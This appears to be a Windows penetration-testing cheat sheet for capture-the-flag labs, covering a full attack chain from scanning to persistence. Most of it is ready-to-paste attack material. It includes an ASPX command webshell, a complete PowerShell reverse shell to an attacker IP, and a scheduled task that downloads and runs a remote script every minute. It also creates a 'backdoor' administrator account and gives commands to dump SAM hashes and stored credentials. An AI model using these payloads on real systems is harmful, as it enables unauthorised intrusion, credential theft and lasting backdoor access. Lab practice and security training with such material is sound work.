## 1\. Recon & Enumeration

### 1.1 Host Discovery

`nmap -sn 10.10.10.0/24`

_Why:_ Identify live hosts.

### 1.2 Port Scanning

`nmap -sC -sV -p- -T4 <IP>`

_Why:_ Show all ports, services, and versions.

### 1.3 Service Enumeration

-   **SMB/NetBIOS**

    `enum4linux -a <IP> smbmap -H <IP> smbclient -L //<IP>/ -N`

-   **RPC**

    `rpcclient -U "" <IP>`

-   **WinRM**

    `crackmapexec winrm <IP> -u users.txt -p passwords.txt`

-   **Web**

    `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`

_Why:_ Services on Windows are entry points — SMB often leaks usernames, shares, or files.

* * *

## 2\. Initial Foothold

### 2.1 Weak/Anonymous Access

-   **SMB**: Anonymous login

    `smbclient \\\\<IP>\\share -N`

-   **RDP**: Weak creds

    `rdesktop <IP>`

### 2.2 Exploiting Services

-   Web RCE (IIS/ASP.NET upload shell).
-   Known CVEs (EternalBlue, PrintNightmare, MS17-010).

    `searchsploit ms17-010`

### 2.3 Payloads

-   **ASPX Webshell**

    `<%@ Page Language="C#" %> <% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"])); %>`

-   **Reverse Shell (PowerShell)**

    `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',4444);$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`

_Why:_ First code execution is usually as low-priv user (IUSR, IIS APPPOOL, etc.).

* * *

## 3\. Shell & Stabilization

### 3.1 Reverse Shell Catcher

`rlwrap nc -lvnp 4444`

### 3.2 Upgrade to Meterpreter (optional)

`use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp`

### 3.3 Basic Enumeration

`whoami whoami /priv systeminfo`

_Why:_ Confirms your privilege level and system details.

* * *

## 4\. Enumeration (Post-Exploitation)

### 4.1 System Information

`systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn`

_Why:_ Check patch level, missing hotfixes = kernel exploits.

### 4.2 Users & Groups

`net user net localgroup net localgroup administrators`

_Why:_ Identify escalation targets.

### 4.3 Network Info

`ipconfig /all route print netstat -ano`

_Why:_ May reveal pivot points.

### 4.4 Running Processes

`tasklist /v`

_Why:_ Look for sensitive processes (db services, admin apps).

### 4.5 Credentials

-   **Registry**

    `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

-   **Unattended installs**

    `dir C:\Windows\Panther\`

-   **Config files**

    `findstr /si password *.txt *.xml *.ini`

_Why:_ Windows loves storing creds in plaintext.

### 4.6 Tools

-   `winPEAS.exe`
    Upload and run for automated enum.

* * *

## 5\. Privilege Escalation

### 5.1 Kernel Exploits

If unpatched:

`windows-exploit-suggester.py --database 2025-09-13-mssb.xls --systeminfo sysinfo.txt`

_Why:_ Find local privilege escalation CVEs.

### 5.2 Misconfigured Services

-   **Unquoted service paths**

    `wmic service get name,displayname,pathname,startmode | findstr /i "Auto"`

-   **Weak service permissions**

    `accesschk.exe -uwcqv "Authenticated Users" * /sc`

_Why:_ Hijack root-owned services.

### 5.3 Token Impersonation

`whoami /all   # look for SeImpersonatePrivilege`

If yes → Juicy Potato / Rogue Potato / PrintSpoofer.

### 5.4 Scheduled Tasks

`schtasks /query /fo LIST /v`

_Why:_ Writable tasks can be hijacked.

### 5.5 DLL Hijacking

Check for services loading missing DLLs.
_Why:_ Place malicious DLL to escalate.

* * *

## 6\. Loot & Post-Exploitation

### 6.1 Flags

`type C:\Users\*\Desktop\user.txt type C:\Users\Administrator\Desktop\root.txt`

### 6.2 SAM & SYSTEM Hives

`reg save HKLM\SAM C:\sam reg save HKLM\SYSTEM C:\system`

Extract hashes with `secretsdump.py`.

### 6.3 Credentials

-   Saved creds in files
-   Browser saved creds (`AppData\Roaming\Microsoft\Credentials`)
* * *

## 7\. Persistence 

-   **Add admin user**

`net user backdoor P@ssw0rd! /add net localgroup administrators backdoor /add`

-   **RDP Enable**

`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`

-   **Scheduled Task Reverse Shell**

`schtasks /create /sc minute /mo 1 /tn "Updater" /tr "powershell.exe -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.7/shell.ps1\")'"`

* * *

## 8\. Cleanup

-   Remove accounts, tasks, shells, backdoors.
-   Reset services to default.
* * *

# Quick Flow

1.  **Nmap** → Find ports/services.
2.  **SMB/RPC/Web** → Enum creds/files.
3.  **Foothold** → Webshell, RCE, weak creds.
4.  **Shell** → Stabilize & enum.
5.  **Privesc** → Kernel, tokens, misconfigs.
6.  **Loot** → Flags, hashes, creds.
7.  **Persist** (optional).
8.  **Cleanup**
